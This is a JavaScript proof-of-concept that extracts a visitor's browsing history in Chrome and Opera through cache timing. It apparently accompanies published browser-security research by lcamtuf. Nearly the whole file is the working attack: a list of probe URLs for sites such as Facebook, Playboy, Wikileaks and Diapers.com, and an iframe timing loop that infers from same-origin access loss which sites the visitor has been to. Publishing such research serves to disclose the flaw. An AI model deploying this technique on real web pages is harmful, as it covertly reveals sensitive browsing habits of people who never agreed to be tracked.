// <title>Chrome & Opera PoC: rapid history extraction through non-destructive cache timing</title>
//
// <!--
//
//   See the comments in the original Firefox experiment for more details about how and
//   why this works:
//
//   http://lcamtuf.coredump.cx/cachetime/firefox.html

/****************
 * SCANNED URLS *
 ****************/

var targets = [

  { 'category': 'New (mostly) cached content' },

  { 'name': 'custom-facebook', 'urls': [ 'http://staticxx.facebook.com/connect/xd_arbiter.php?version=42' ] },
  { 'name': 'google analytics', 'urls': [ 'https://www.google-analytics.com/analytics.js',
                                          'http://www.google-analytics.com/plugins/ua/linkid.js' ] },

  { 'name': 'common icons', 'urls': [ 'https://a.gfx.ms/hig/img/controls.png',
                                      'http://www.google-analytics.com/plugins/ua/linkid.js' ] },

  { 'name': 'hotmail', 'urls': [ 'https://col128.mail.live.com/ol/clear.gif',
                                 'http://www.hotmail.com/' ] },

  { 'name': 'not a real link', 'urls': [ 'https://www.aslibjl.com' ] },

  { 'name': 'lcamtuf favicon', 'urls': [ 'http://lcamtuf.coredump.cx/favicon.ico' ] },

  { 'name': 'rubyonrails.org', 'urls': [ 'http://guides.rubyonrails.org/images/favicon.ico',
                                         'http://guides.rubyonrails.org/javascripts/syntaxhighlighter/shBrushXml.js',
                                         'http://guides.rubyonrails.org/javascripts/guides.js'  ] },

  { 'category': 'Social networks' },

  { 'name': 'Facebook', 'urls': [ 'https://s-static.ak.facebook.com/rsrc.php/v1/yX/r/HN0ehA1zox_.js',
                                  'http://static.ak.facebook.com/rsrc.php/v1/yX/r/HN0ehA1zox_.js',
                                  'http://static.ak.fbcdn.net/rsrc.php/v1/yX/r/HN0ehA1zox_.js' ] },

/*

  { 'name': 'Twitter', 'urls': [ 'http://a0.twimg.com/a/1323193483/phoenix/css/phoenix_core.bundle.css',
                                 'http://a2.twimg.com/a/1323193483/phoenix/css/phoenix_core.bundle.css',
                                 'http://a0.twimg.com/a/1323193483/phoenix/css/phoenix_more.bundle.css',
                                 'https://si0.twimg.com/a/1323193483/phoenix/css/phoenix_core.bundle.css',
                                 'https://twimg0-a.akamaihd.net/a/1323193483/phoenix/css/phoenix_core.bundle.css' ] },

*/

  { 'name': 'Google Plus', 'urls': [ 'https://ssl.gstatic.com/gb/js/abc/gcm_57b1882492d4d0138a0a7ea7240394ca.js' ] },

  { 'name': 'Dogster', 'urls': [ 'http://a1.cdnsters.com/static/resc/labjs1.2.0-jquery1.6-jqueryui1.8.12-bugfix4758.min.js.gz',
                                 'http://a1.cdnsters.com/static/resc/labjs1.2.0-jquery1.6-jqueryui1.8.12-bugfix4758.min.js' ] },

  { 'name': 'MySpace', 'urls': [ 'http://x.myspacecdn.com/modules/common/static/css/futuraglobal_kqj36l0b.css' ] },

  { 'category': 'Content platforms' },

  { 'name': 'Youtube', 'urls': [ 'http://s.ytimg.com/yt/cssbin/www-refresh-vflMpNCTQ.css' ] },

  { 'name': 'Hulu', 'urls': [ 'http://static.huluim.com/system/hulu_0cd8f497_1.css' ] },

  { 'name': 'Flickr', 'urls': [ 'http://l.yimg.com/g/css/c_fold_main.css.v109886.64777.105425.23' ] },

  { 'name': 'JustinBieberMusic.com', 'urls': [ 'http://www.justinbiebermusic.com/underthemistletoe/js/fancybox.js' ] },

  { 'name': 'Playboy', 'urls': [ 'http://www.playboy.com/wp-content/themes/pb_blog_r1-0-0/css/styles.css' /* 4h */ ] },

  { 'category': 'Online media' },

  { 'name': 'New York Times', 'urls': [ 'http://js.nyt.com/js2/build/sitewide/sitewide.js' ] },

  { 'name': 'CNN', 'urls': [ 'http://z.cdn.turner.com/cnn/tmpl_asset/static/www_homepage/835/css/hplib-min.css',
                             'http://z.cdn.turner.com/cnn/tmpl_asset/static/intl_homepage/564/css/intlhplib-min.css' ] },

  { 'name': 'Reddit', 'urls': [ 'http://www.redditstatic.com/reddit.en-us.xMviOWUyZqo.js' ] },

  { 'name': 'Slashdot', 'urls': [ 'http://a.fsdn.com/sd/classic.css?release_20111207.02' ] },

  { 'name': 'Fox News', 'urls': [ 'http://www.fncstatic.com/static/all/css/head.css?1' ] },

  { 'name': 'AboveTopSecret.com', 'urls': [ 'http://www.abovetopsecret.com/forum/ats-scripts.js' ] },

  { 'name': 'Wikileaks', 'urls': [ 'http://wikileaks.org/squelettes/jquery-1.6.4.min.js' ] },

  { 'category': 'Commerce' },

  { 'name': 'Diapers.com', 'urls': [ 'http://c1.diapers.com/App_Themes/Style/style.css?ReleaseVersion=5.2.12',
                                     'http://c3.diapers.com/App_Themes/Style/style.css?ReleaseVersion=5.2.12' ] },

  { 'name': 'Expedia', 'urls': [ 'http://www.expedia.com/static/default/default/scripts/expedia/core/e.js?v=release-2011-11-r4.9.317875' ] },

  { 'name': 'Amazon (US)', 'urls': [ 'http://z-ecx.images-amazon.com/images/G/01/browser-scripts/us-site-wide-css-quirks/site-wide-3527593236.css._V162874846_.css' ] },

  { 'name': 'Newegg', 'urls': [ 'http://images10.newegg.com/WebResource/Themes/2005/CSS/template.v1.w.5723.0.css' ] },

  { 'name': 'eBay', 'urls': [ 'http://ir.ebaystatic.com/v4js/z/io/gbsozkl4ha54vasx4meo3qmtw.js' ] }

];


/*************************
 * CONFIGURABLE SETTINGS *
 *************************/

var TIME_LIMIT = 3; /* used to be 2 */
var MAX_ATTEMPTS = 1;

/**********************
 * MAIN STATE MACHINE *
 **********************/

var log_area;

var target_off = 0;
var attempt = 0;
var confirmed_visited = false;

var current_url, current_name;
var wait_cycles;

var frame_ready = false;

var start, stop, urls;

/* The frame points to about:blank. Initialize a new test, giving the
   about:blank frame some time to fully load. */

function perform_check() {

  wait_cycles = 0;

  setTimeout(wait_for_read1, 1);

}


/* Confirm that about:blank is loaded correctly. */

function wait_for_read1() {

  if (wait_cycles++ > 100) {
    alert('Something went wrong, sorry.');
    return;
  }

  try {

    if (frames['f'].location.href != 'about:blank') throw 1;

    frames['f'].stop();
    document.getElementById('f').src ='javascript:"<body onload=\'parent.frame_ready = true\'>"';

    setTimeout(wait_for_read2, 1);

  } catch (e) {

    setTimeout(wait_for_read1, 1);

  }

}


function wait_for_read2() {

  if (wait_cycles++ > 100) {
    alert('Something went wrong, sorry.');
    return;
  }

  if (!frame_ready) {

    setTimeout(wait_for_read2, 1);

  } else {

    frames['f'].stop();
    setTimeout(navigate_to_target, 1);

  }

}



/* Navigate the frame to the target URL. */

function navigate_to_target() {

  cycles = 0;

  setTimeout(wait_for_noread, 1);

  urls++;
  document.getElementById("f").src = current_url;

}


/* The browser is now trying to load the destination URL. Let's see if
   we lose SOP access before we hit TIME_LIMIT. If yes, we have a cache
   hit. If not, seems like cache miss. In both cases, abort pending
   navigation by pointing the frame back to about:blank when done. */

function wait_for_noread() {

  try {

    if (frames['f'].location.href == undefined) throw 1;


    if (cycles++ >= TIME_LIMIT) {

      maybe_test_next();
      return;

    }

    setTimeout(wait_for_noread, 1);

  } catch (e) {

    confirmed_visited = true;
    maybe_test_next();

  }

}


/* Just a logging helper. */

function log_text(str, type, cssclass) {

  var el = document.createElement(type);
  var tx = document.createTextNode(str);

  el.className = cssclass;
  el.appendChild(tx);

  log_area.appendChild(el);

}


/* Decides what to do next. May schedule another attempt for the same target,
   select a new target, or wrap up the scan. */

function maybe_test_next() {

  frame_ready = false;

  document.getElementById('f').src = 'about:blank';


  if (target_off < targets.length) {

    if (targets[target_off].category) {

      log_text(targets[target_off].category + ':', 'p', 'category');
      target_off++;

    }


    if (confirmed_visited) {

      log_text('Visited: ' + current_name + ' [' + cycles + ':' + attempt + ']', 'li', 'visited');

    }

    if (confirmed_visited || attempt == MAX_ATTEMPTS * targets[target_off].urls.length) {

      if (!confirmed_visited)
        log_text('Not visited: ' + current_name + ' [' + cycles + '+]', 'li', 'not_visited');

      confirmed_visited = false;
      target_off++;
      attempt = 0;

      maybe_test_next();

    } else {

      current_url = targets[target_off].urls[attempt % targets[target_off].urls.length];
      current_name = targets[target_off].name;

      attempt++;

      perform_check();

    }

  } else {

    en = (new Date()).getTime();

    document.getElementById('status').innerHTML = 'Tested ' + urls + ' individual URLs in ' + (en - st) + ' ms.';

    document.getElementById('btn').disabled = false;

    document.getElementById('survey').style.display = 'inline';

  }

}


/* The handler for "run the test" button on the main page. Dispenses
   advice, resets state if necessary. */

function start_stuff() {

  if (navigator.userAgent.indexOf('Chrome/') == -1 &&
      navigator.userAgent.indexOf('Opera/') == -1) {

    alert('This proof-of-concept is specific to Chrome and Opera, and probably won\'t work for you.\n\n' +
          'Versions for other browsers can be found here:\n' +
          'http://lcamtuf.coredump.cx/cachetime/');

  }

  target_off = 0;
  attempt = 0;
  confirmed_visited = false;

  document.getElementById('btn').disabled = true;

  log_area = document.getElementById('log');
  log_area.innerHTML = '';

  st = (new Date()).getTime();
  urls = 0;

  maybe_test_next();

}


/* Survey helper. */

function survey(answer) {
  var x = new XMLHttpRequest();
  x.open('GET', 'survey.cgi?' + answer, false);
  x.send(null);
  alert('Thanks for the feedback!');
  document.getElementById('survey').style.display = 'none';
  return false;
}
